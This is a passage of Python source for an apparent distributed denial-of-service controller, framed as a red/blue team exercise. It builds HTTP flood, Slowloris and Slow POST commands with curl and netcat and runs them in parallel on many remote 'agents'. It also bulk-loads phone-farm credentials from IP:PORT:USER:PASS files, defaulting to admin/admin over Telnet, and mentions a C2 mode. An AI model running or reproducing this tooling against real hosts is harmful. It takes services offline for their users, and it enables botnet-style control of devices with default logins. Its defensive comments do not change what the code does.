        This is the Bash equivalent of the Go HTTPS flood you saw,
        but using curl instead of raw TLS sockets.
        """
        if self.agents and self.agents[0].os_type == "termux":
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        else:
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: {random.choice(USER_AGENTS)}' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        return cmd
    
    def _build_slowloris_command(self, target_host, target_port=80, count=5):
        """
        Build a Slowloris-style test command using netcat (nc).
        
        HOW SLOWLORIS WORKS:
            1. Open TCP connection to target
            2. Send partial HTTP headers (missing the final \\r\\n\\r\\n)
            3. Server waits for the rest of the request...
            4. Every few seconds, send another header line (keep-alive)
            5. Server keeps waiting... holding a worker thread open
            6. If server has limited workers (Apache default: 150),
               150 slow connections = server can't serve anyone else
        
        THE COMMAND (simplified):
            echo -ne 'GET / HTTP/1.1\\r\\nHost: target\\r\\nX-Keep: alive\\r\\n'
            sleep 3  <- wait 3 seconds (server is still waiting for complete request)
            echo -ne 'X-Keep: alive\\r\\n'  <- send another header to keep connection alive
            sleep 3
            echo -ne 'X-Keep: alive\\r\\n'
        
        Pipe this into nc (netcat) which sends it to the target.
        The & at the end runs each connection in the background.
        """
        cmd = (
            f"for i in $(seq 1 {count}); do "
            # Open slow connection - send partial headers (NO \\r\\n\\r\\n at end)
            f"(echo -ne 'GET /slowloris-test-{random.randint(1000,9999)} HTTP/1.1\\r\\n"
            f"Host: {target_host}\\r\\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\\r\\n"
            f"X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            # Wait 3 seconds - server is still holding the connection open
            f"sleep 3; "
            # Send another header to keep connection alive
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 3; "
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 2) | nc -w 15 {target_host} {target_port} 2>/dev/null & "
            # & = run in background so we can open multiple connections
            f"done; "
            f"wait; echo 'DONE'"  # Wait for all background connections to finish
        )
        return cmd
    
    # ========================================================================
    # RESULT COLLECTOR - Runs in a thread for each phone
    # ========================================================================
    
    def _run_agent_command(self, agent, command, result_list, lock):
        """
        Send a command to one agent and collect the results.
        
        WHY THREADING:
            - Each phone runs independently (don't wait for one to finish)
            - threading.Lock() prevents two threads from writing results at the same time
            - lock = a mutex (only one thread can hold it at a time)
            - "with lock:" = acquire lock, do work, release lock
        
        HOW STATUS CODES ARE PARSED:
            The curl -w '%{http_code}' outputs numbers like "200" or "403".
            We split the response text and look for 3-digit numbers.
            Then classify them:
                200-399 = successful (target responded normally)
                429/503/403/508 = blocked (defense is working!)
                anything else = error
        """
        agent.busy = True
        agent.last_status = "Attacking"
        success, response = agent.execute(command, timeout=120)
        
        with lock:  # Only one thread can write results at a time
            result_list.append({
                'agent_id': agent.agent_id,
                'host': agent.host,
                'protocol': agent.protocol,
                'success': success,
                'response': response[:500] if response else "",  # Limit response size
            })
            
            if success:
                # Parse HTTP status codes from the response text
                # curl -w '%{http_code}' outputs status codes like "200 200 403 200"
                codes_found = []
                for word in response.split():
                    word = word.strip()
                    if word.isdigit() and len(word) == 3:  # 3-digit number = HTTP status
                        codes_found.append(int(word))
                
                # Update global stats
                self.stats['total_requests'] += len(codes_found)
                for code in codes_found:
                    if 200 <= code < 400:
                        # 200-399 = success (target responded)
                        self.stats['successful'] += 1
                    elif code in [429, 503, 403, 508]:
                        # 429 = Too Many Requests (rate limiting working)
                        # 503 = Service Unavailable (WAF/CDN blocking)
                        # 403 = Forbidden (WAF blocking)
                        # 508 = Loop Detected (CDN loop)
                        self.stats['blocked'] += 1
                    else:
                        self.stats['errors'] += 1
            
            agent.busy = False
            agent.last_status = "Idle"
    
    # ========================================================================
    # BATTLE PHASES
    # ========================================================================
    # Each phase tests a different type of DoS attack:
    #   Phase 1 (Recon):      Light probing - just 5 requests per phone
    #   Phase 2 (Flood):      Rapid HTTP requests - 50+ per phone
    #   Phase 3 (Slowloris):  Slow connection exhaustion
    #   Phase 4 (Slow POST):  Slow body upload
    
    def phase_recon(self, target_url):
        """
        PHASE 1: Reconnaissance - Light probing.
        
        Each phone sends just 5 gentle requests with 0.5s delay.
        This tests if the target is alive and responding normally.
        Good for checking: Is the target up? What status codes does it return?
        
        If even 5 requests get blocked -> target has aggressive rate limiting.
        If all 5 succeed -> target has NO basic protection.
        """
        self._stop_flag.clear()  # Reset stop flag for new phase
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold cyan][PHASE 1] Reconnaissance - Light probing[/bold cyan]")
        console.print(f"[dim]   Each agent sends 5 gentle requests to map target[/dim]")
        
        results = []
        lock = threading.Lock()       # Thread-safe result collection
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            # Build curl command: 5 requests, 0.5 second delay between each
            cmd = self._build_curl_command(target_url, count=5, delay=0.5)
            # Start a thread for this phone
            t = threading.Thread(target=self._run_agent_command, 
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for all threads to finish (max 60 seconds)
        for t in threads:
            t.join(timeout=60)
        
        # Show results per phone
        for r in results:
            status = "OK" if r['success'] else "FAIL"
            console.print(f"  [{status}] Agent {r['agent_id']} ({r['host']}): "
                         f"{len([w for w in r['response'].split() if w.isdigit() and len(w)==3])} responses")
        
        return results
    
    def phase_flood(self, target_url, requests_per_agent=50, path="/"):
        """
        PHASE 2: HTTP Flood - Rapid fire requests.
        
        Each phone sends 50+ requests as fast as possible.
        No delay between requests = maximum throughput.
        
        This simulates a real Layer 7 DDoS flood attack.
        Blue team should see their rate limiting kick in.
        
        IF: >10% requests blocked -> Blue team defense is working
        IF: <10% blocked -> Target is vulnerable to flood attacks
        
        MATH:
            5 phones x 50 requests = 250 requests total
            If target blocks after 30 requests -> block rate = 30/250 = 12%
            That means rate limiting IS working (good for blue team)
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        agent_count = sum(1 for a in self.agents if a.connected)
        total_requests = agent_count * requests_per_agent
        
        console.print(f"\n[bold red][PHASE 2] HTTP Flood - {agent_count} agents x {requests_per_agent} requests[/bold red]")
        console.print(f"[dim]   Total: ~{total_requests} requests | Ctrl+C = EMERGENCY STOP[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        self.running = True
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_flood_command(target_url, count=requests_per_agent, path=path)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for all phones to finish (max 3 minutes)
        for t in threads:
            t.join(timeout=180)
        
        self.running = False
        
        # Calculate block rate - tells us how well the defense is working
        blocked = self.stats['blocked']
        total = self.stats['total_requests']
        if total > 0:
            block_rate = (blocked / total) * 100
            if block_rate > 10:
                # More than 10% blocked = defense is working
                console.print(f"\n  [green]Blue Team Defense: {block_rate:.0f}% requests blocked![/green]")
            else:
                # Less than 10% blocked = target is vulnerable
                console.print(f"\n  [red]Red Team Success: Only {block_rate:.0f}% blocked - target vulnerable![/red]")
        
        return results
    
    def phase_slowloris(self, target_host, target_port=80, connections_per_agent=3):
        """
        PHASE 3: Slowloris - Slow connection exhaustion.
        
        Each phone opens multiple slow connections.
        Sends partial headers, then keeps sending keep-alive headers every 3 seconds.
        Server holds each connection open, using up its worker threads.
        
        DEFENSE AGAINST SLOWLORIS:
            Apache: Set Timeout 30, MaxRequestWorkers 150
            Nginx:  client_body_timeout 12s, keepalive_timeout 10s
            HAProxy: timeout client 10s, timeout http-request 5s
        
        If blue team configures these correctly, slow connections get dropped.
        If NOT configured -> slow connections stay open -> server can't serve real users.
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold yellow][PHASE 3] Slowloris - Slow connection exhaustion[/bold yellow]")
        console.print(f"[dim]   Each agent opens {connections_per_agent} slow connections[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_slowloris_command(target_host, target_port, 
                                                 count=connections_per_agent)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    def phase_slow_post(self, target_url, connections_per_agent=2):
        """
        PHASE 4: Slow POST - Slow body upload.
        
        Sends a POST request with Content-Length: 65536 (64KB)
        but sends the actual data very slowly (16 bytes at a time with delays).
        Server waits for the full 64KB... and waits... and waits...
        
        This ties up server resources because:
        - Server allocates buffer for 64KB body
        - Server holds connection waiting for data
        - Each slow POST = one less connection for real users
        
        DEFENSE:
            - Limit request body size
            - Set minimum data rate (MinRate in Apache)
            - Timeout slow uploads
        """
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold magenta][PHASE 4] Slow POST - Slow body upload[/bold magenta]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            
            if agent.os_type == "termux":
                # Termux: Use netcat to send raw POST with slow data
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"(echo -ne 'POST /slowpost-test HTTP/1.1\\r\\n"
                    f"Host: {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url}\\r\\n"
                    f"Content-Type: application/x-www-form-urlencoded\\r\\n"
                    f"Content-Length: 65536\\r\\n"
                    f"Connection: keep-alive\\r\\n\\r\\n'; "
                    f"for j in $(seq 1 100); do "
                    f"echo -ne 'A=AAAAAAAAAAAAAAAA'; sleep 0.5; "
                    f"done) | nc -w 30 {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url} 80 2>/dev/null & "
                    f"done; wait; echo 'DONE'"
                )
            else:
                # Linux: Use curl with --limit-rate for slow upload
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"curl -s -X POST '{target_url}/slowpost-test' "
                    f"-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-H 'Transfer-Encoding: chunked' "
                    f"--limit-rate 16 -d 'A=AAAA' "
                    f"--max-time 30 2>/dev/null; "
                    f"done; echo 'DONE'"
                )
            
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    # ========================================================================
    # UTILITY METHODS
    # ========================================================================
    
    def get_agent_status(self):
        """Get status of all agents as a list of dictionaries"""
        status_list = []
        for agent in self.agents:
            status_list.append({
                'id': agent.agent_id,
                'host': agent.host,
                'port': agent.port,
                'protocol': agent.protocol,
                'connected': agent.connected,
                'os_type': agent.os_type,
                'busy': agent.busy,
                'status': agent.last_status,
                'requests_sent': agent.requests_sent
            })
        return status_list
    
    def get_stats(self):
        """Get battle statistics including requests per second"""
        elapsed = 0
        if self.stats['start_time']:
            elapsed = round(time.time() - self.stats['start_time'], 1)
        
        return {
            **self.stats,
            'elapsed_seconds': elapsed,
            'requests_per_second': round(self.stats['total_requests'] / max(elapsed, 1), 1),
            'agents_total': len(self.agents),
            'agents_active': sum(1 for a in self.agents if a.connected)
        }
    
    def display_dashboard(self):
        """
        Display a live battle dashboard showing:
            - Agent table: which phones are connected, protocol, OS, status
            - Stats panel: total requests, blocked rate, requests/sec
        
        This is what blue team and red team see during the exercise.
        """
        stats = self.get_stats()
        
        # Agent status table
        agent_table = Table(
            title="[bold red]Agent Status[/bold red]",
            box=box.ROUNDED, border_style="red"
        )
        agent_table.add_column("ID", style="yellow", width=4)
        agent_table.add_column("Host", style="cyan", width=18)
        agent_table.add_column("Proto", style="magenta", width=6)
        agent_table.add_column("OS", style="green", width=8)
        agent_table.add_column("Connected", style="green", width=10)
        agent_table.add_column("Status", style="white", width=20)
        
        for agent in self.agents:
            conn = "YES" if agent.connected else "NO"
            agent_table.add_row(
                str(agent.agent_id),
                f"{agent.host}:{agent.port}",
                agent.protocol.upper(),
                agent.os_type or "?",
                conn,
                agent.last_status
            )
        
        console.print(agent_table)
        
        # Stats panel
        console.print(Panel(
            f"[bold]Battle Statistics[/bold]\n\n"
            f"  Agents Active: [green]{stats['agents_active']}/{stats['agents_total']}[/green]\n"
            f"  Total Requests: [cyan]{stats['total_requests']}[/cyan]\n"
            f"  Successful: [green]{stats['successful']}[/green] | "
            f"Blocked: [red]{stats['blocked']}[/red] | "
            f"Errors: [yellow]{stats['errors']}[/yellow]\n"
            f"  Requests/sec: [bold]{stats['requests_per_second']}[/bold]\n"
            f"  Phases Run: {stats['phases_run']}\n"
            f"  Elapsed: {stats['elapsed_seconds']}s",
            title="[bold red]Battle Dashboard[/bold red]",
            border_style="red",
            box=box.HEAVY
        ))
    
    # ========================================================================
    # BULK LOADING & DIAGNOSTICS (for 4K phone farms)
    # ========================================================================

    def load_file(self, filepath):
        """
        Load agents from a creds file. Supports thousands of phones.
        
        FILE FORMAT (one line per phone):
            IP:PORT:USER:PASS
            IP:PORT:USER:PASS
            ...
        
        EXAMPLE FILE (farm.txt):
            192.168.1.10:23:admin:password1
            192.168.1.11:23:admin:password2
            10.0.0.5:8022:root:mypass
        
        SHORTCUT FORMATS:
            IP:PORT              (uses default admin/admin)
            IP                   (uses default port 23, admin/admin)
        """
        if not os.path.exists(filepath):
            return False, f"File not found: {filepath}"
        
        added = 0
        failed = 0
        
        try:
            with open(filepath, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = line.split(':')
                    try:
                        if len(parts) >= 4:
                            host, port_str, user, passwd = parts[0], parts[1], parts[2], parts[3]
                            port = int(port_str)
                        elif len(parts) == 2:
                            host, port_str = parts
                            port = int(port_str)
                            user, passwd = 'admin', 'admin'
                        elif len(parts) == 1:
                            host = parts[0]
                            port = 23
                            user, passwd = 'admin', 'admin'
                        else:
                            failed += 1
                            continue
                        
                        success, msg = self.add_agent(host, port, user, passwd)
                        if success:
                            added += 1
                        else:
                            failed += 1
                    except (ValueError, IndexError):
                        failed += 1
                        continue
        except Exception as e:
            return False, f"Error reading file: {str(e)}"
        
        return True, f"Loaded {added} agents ({failed} failed) from {filepath}"
    
    def probe_agent(self, host, port=None):
        """
        Probe a phone to see what ports are open and diagnose connection issues.
        
        WHY: When connection fails, this tells you WHY:
            - No ports open = phone off or behind NAT
            - SSH open = use SSH (port 8022)
            - Telnet open = use Telnet (port 23)
        """
        ports_to_check = [23, 8022, 22, 80, 443, 8080]
        if port and int(port) not in ports_to_check:
            ports_to_check.insert(0, int(port))
        
        results = {'host': host, 'ports': {}, 'recommendation': ''}
        open_ports = []
        
        for p in ports_to_check:
            is_open, msg = check_port(host, p, timeout=5)
            results['ports'][p] = {'open': is_open, 'detail': msg}
            if is_open:
                open_ports.append(p)
        
        if not open_ports:
            results['recommendation'] = (
                "NO PORTS OPEN - Phone unreachable.\n"
                "Causes: phone off, cellular NAT, wrong IP\n"
                "SOLUTION: Same WiFi network, VPN overlay (Tailscale), or HTTP C2 mode"
            )
        elif 8022 in open_ports or 22 in open_ports:
            ssh_port = 8022 if 8022 in open_ports else 22
            results['recommendation'] = f"SSH port {ssh_port} is OPEN! Use port {ssh_port}."
        elif 23 in open_ports:
            results['recommendation'] = "Telnet port 23 is OPEN. Standard Telnet should work."
        
        return results
